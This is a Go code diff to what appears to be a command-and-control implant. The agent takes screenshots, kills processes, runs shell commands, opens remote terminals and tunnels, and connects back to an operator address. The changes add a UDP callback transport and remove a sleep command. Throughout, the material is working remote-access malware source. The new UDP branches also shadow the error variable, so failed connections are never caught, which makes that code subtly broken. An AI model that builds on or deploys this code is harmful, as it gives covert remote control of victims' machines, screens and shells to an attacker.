@@ -105,9 +105,6 @@ func TaskProcess(commands [][]byte) [][]byte {
 		case utils.COMMAND_SCREENSHOT:
 			data, err = taskScreenshot()
 
-		case utils.COMMAND_SLEEP:
-			data, err = taskSleep(command.Data)
-
 		case utils.COMMAND_TERMINAL_START:
 			jobTerminal(command.Data)
 
@@ -301,7 +298,12 @@ func taskKill(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	err = functions.KillProcess(params.Pid)
+	proc, err := os.FindProcess(params.Pid)
+	if err != nil {
+		return nil, err
+	}
+
+	err = proc.Signal(syscall.SIGKILL)
 	return nil, err
 }
 
@@ -446,24 +448,6 @@ func taskScreenshot() ([]byte, error) {
 	}
 
 	return msgpack.Marshal(utils.AnsScreenshots{Screens: screens})
-}
-
-func taskSleep(paramsData []byte) ([]byte, error) {
-	var params utils.ParamsSleep
-	err := msgpack.Unmarshal(paramsData, &params)
-	if err != nil {
-		return nil, err
-	}
-
-	if params.Seconds < 1 {
-		return nil, fmt.Errorf("sleep time must be at least 1 second")
-	}
-
-	// 修改全局profile的SleepTime
-	// Modify global profile SleepTime
-	profile.SleepTime = params.Seconds
-
-	return msgpack.Marshal(utils.AnsSleep{Seconds: params.Seconds})
 }
 
 func taskShell(paramsData []byte) ([]byte, error) {
@@ -632,7 +616,15 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 	}
 
 	var conn net.Conn
-	if profile.UseSSL {
+	if profile.Protocol == "udp" {
+		// UDP connection
+		udpAddr, err := net.ResolveUDPAddr("udp", profile.Addresses[0])
+		if err != nil {
+			return nil, err
+		}
+		conn, err = net.DialUDP("udp", nil, udpAddr)
+	} else if profile.UseSSL {
+		// TCP with SSL/TLS
 		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
 		if certerr != nil {
 			return nil, err
@@ -649,6 +641,7 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 		conn, err = tls.Dial("tcp", profile.Addresses[0], config)
 
 	} else {
+		// TCP without SSL
 		conn, err = net.Dial("tcp", profile.Addresses[0])
 	}
 	if err != nil {
@@ -772,7 +765,16 @@ func jobRun(paramsData []byte) ([]byte, error) {
 	}
 
 	var conn net.Conn
-	if profile.UseSSL {
+	if profile.Protocol == "udp" {
+		// UDP connection
+		udpAddr, err := net.ResolveUDPAddr("udp", profile.Addresses[0])
+		if err != nil {
+			procCancel()
+			return nil, err
+		}
+		conn, err = net.DialUDP("udp", nil, udpAddr)
+	} else if profile.UseSSL {
+		// TCP with SSL/TLS
 		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
 		if certerr != nil {
 			procCancel()
@@ -1050,7 +1052,15 @@ func jobTunnel(paramsData []byte) {
 		}
 
 		var srvConn net.Conn
-		if profile.UseSSL {
+		if profile.Protocol == "udp" {
+			// UDP connection
+			udpAddr, err := net.ResolveUDPAddr("udp", profile.Addresses[0])
+			if err != nil {
+				return
+			}
+			srvConn, err = net.DialUDP("udp", nil, udpAddr)
+		} else if profile.UseSSL {
+			// TCP with SSL/TLS
 			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
 			if certerr != nil {
 				return
@@ -1067,6 +1077,7 @@ func jobTunnel(paramsData []byte) {
 			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
 
 		} else {
+			// TCP without SSL
 			srvConn, err = net.Dial("tcp", profile.Addresses[0])
 		}
 		if err != nil {
@@ -1165,7 +1176,15 @@ func jobTerminal(paramsData []byte) {
 		}
 
 		var srvConn net.Conn
-		if profile.UseSSL {
+		if profile.Protocol == "udp" {
+			// UDP connection
+			udpAddr, err := net.ResolveUDPAddr("udp", profile.Addresses[0])
+			if err != nil {
+				return
+			}
+			srvConn, err = net.DialUDP("udp", nil, udpAddr)
+		} else if profile.UseSSL {
+			// TCP with SSL/TLS
 			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
 			if certerr != nil {
 				return
@@ -1182,6 +1201,7 @@ func jobTerminal(paramsData []byte) {
 			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
 
 		} else {
+			// TCP without SSL
 			srvConn, err = net.Dial("tcp", profile.Addresses[0])
 		}
 		if err != nil {
